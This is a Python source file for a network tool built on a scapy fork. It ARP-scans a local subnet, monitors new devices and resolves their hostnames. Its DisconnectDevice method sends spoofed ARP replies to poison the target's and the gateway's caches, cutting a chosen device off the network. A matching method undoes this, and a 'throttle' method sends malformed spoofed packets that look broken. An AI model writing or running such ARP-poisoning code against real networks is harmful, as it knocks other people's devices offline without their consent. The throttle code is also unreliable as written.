from turtle import dot
import WindowsConfig
import kamene.all as scapy
import socket
import threading
import time
import os

class NetworkHandler():
    def __init__(self, verbose=False, preconfigured=True, confiurationFile="NetworkDB.json", CustomConfiguration = {}):
        self.verbose = verbose
        #scan 3time for connected devices at the startup
        self.connectedDevices = []
        if self.verbose:
            print("Scanning for connected devices...")
        for x in range(1, 4):
            #merge the list of connected devices
            self.connectedDevices += self.GetConnectedDevice()
            if self.verbose:
                print(f"{x}/3")
        if self.verbose:
            print("Connected devices scanned")
            print(self.connectedDevices)

        if preconfigured:
            self.LocalIP = self.GetLocalIP()
            self.baseIP = self.LocalIP.split(".")[0] + "." + self.LocalIP.split(".")[1] + "." + self.LocalIP.split(".")[2] + "."
            self.DefaultGateway = self.baseIP + "1"
            if os.name == "nt":
                self.DefaultGateway = WindowsConfig.GetDefaultGateway()
            self.config = {
                "LocalIP": self.GetLocalIP(),
                "self.baseIP": self.GetLocalIP().split(".")[0] + "." + self.GetLocalIP().split(".")[1] + "." + self.GetLocalIP().split(".")[2] + ".",
                "DefaultGateway": self.DefaultGateway
            }

        else:
            self.DefaultGateway = CustomConfiguration["DefaultGateway"]
            self.baseIpRange = CustomConfiguration["baseIpRange"]
            self.baseIP = CustomConfiguration["baseIP"]
            self.LocalIP = CustomConfiguration["LocalIP"]
            self.config = {
                "LocalIP": self.LocalIP,
                "self.baseIP": self.baseIP,
                "DefaultGateway": self.DefaultGateway,
            }


    def GetLocalIP(self):
        return socket.gethostbyname(socket.gethostname())

    def GetConnectedDevice(self):
        """
        Get the connected devices on the local network
        """
        #get the local ip
        localIp = self.GetLocalIP()
        #get the local ip range
        localIpRange = localIp.split(".")
        localIpRange.pop()
        localIpRange = ".".join(localIpRange)
        localIpRange += ".1/24"
        #scan the local network
        arpRequest = scapy.ARP(pdst=localIpRange)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arpRequestBroadcast = broadcast/arpRequest
        answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
        #get the ip and mac address of the connected devices
        connectedDevices = []
        for element in answeredList:
            deviceDict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            connectedDevices.append(deviceDict)
        return connectedDevices

    def OnConnectedDevice(self, callback):
        """
        Call the callback function when a new device connects to the network
        """
        def Scanner():
            while True:
                #get the connected devices
                connectedDevices = self.GetConnectedDevice()
                #check if there is a new device
                for device in connectedDevices:
                    if device not in self.connectedDevices:
                        self.connectedDevices.append(device)
                        callback(device)
                time.sleep(5)
        threading.Thread(target=Scanner).start()

    def getHostName(self, ip):
        """
        Get the hostname of a device
        """
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return None

    def GetCompleteDevicesList(self):
        """
        Get connected devices with hes HostName
        """
        #get the connected devices
        connectedDevices = self.GetConnectedDevice()
        #get the hostname of the connected devices
        for device in connectedDevices:
            device["hostname"] = self.getHostName(device["ip"])
        return connectedDevices

    def GetBoxName(self):
        """
        Get the name of the network
        """
        #get computer arp table
        computerArpTable = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=self.GetLocalIP()), timeout=2, verbose=False)[0]
        #get the name of the network
        for element in computerArpTable:
            #return ip
            return element[1].psrc


    def DisconnectDevice(self, ip):
        """
        Disconnect a device from the network
        """
        #get the mac address of the device
        mac = self.GetMac(ip)
        if self.verbose:
            print(f"sending packet pdst={ip} hwdst={mac} psrc={self.DefaultGateway} hwsrc=00:00:00:00:00:00")
        #send the packet
        scapy.send(scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=self.DefaultGateway, hwsrc="00:00:00:00:00:00"), verbose=False)
        #do the same thing but with the gateway
        scapy.send(scapy.ARP(op=2, pdst=self.DefaultGateway, hwdst=self.GetMac(self.DefaultGateway), psrc=ip, hwsrc="00:00:00:00:00:00"), verbose=False)
        if self.verbose:
            print(f"Device {ip} disconnected")

    def DeUnblockDevice(self, ip):
        """
        Unblock a device from the network
        """
        #get the mac address of the device
        mac = self.GetMac(ip)
        if self.verbose:
            print(f"sending packet pdst={ip} hwdst={mac} psrc={self.DefaultGateway} hwsrc={self.GetMac(self.DefaultGateway)}")
        #send the packet
        scapy.send(scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=self.DefaultGateway, hwsrc=self.GetMac(self.DefaultGateway)), verbose=False)
        #do the same thing but with the gateway
        scapy.send(scapy.ARP(op=2, pdst=self.DefaultGateway, hwdst=self.GetMac(self.DefaultGateway), psrc=ip, hwsrc=self.GetMac(ip)), verbose=False)
        if self.verbose:
            print(f"Device {ip} unblocked")

    def throttleDevice(self, ip, bandwidth=10):
        """
        Throttle a device
        """
        #get the mac address of the device
        mac = self.GetMac(ip)
        #send the packet
        scapy.send(scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=self.GetLocalIP(), hwsrc="00:00:00:00:00:00:00"), verbose=False)
        #send the packet
        scapy.send(scapy.ARP(op=2, pdst=self.GetLocalIP(), hwdst="00:00:00:00:00:00:00", psrc=ip, hwsrc=mac), verbose=False)
    def GetMac(self, ip):
        """
        Get the mac address of a device
        """
        #get mac address of the device 
        arpRequest = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arpRequestBroadcast = broadcast/arpRequest
        answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
        return answeredList[0][1].hwsrc

    def GetGateway(self):
        """
        Get the gateway of the network
        """
        pass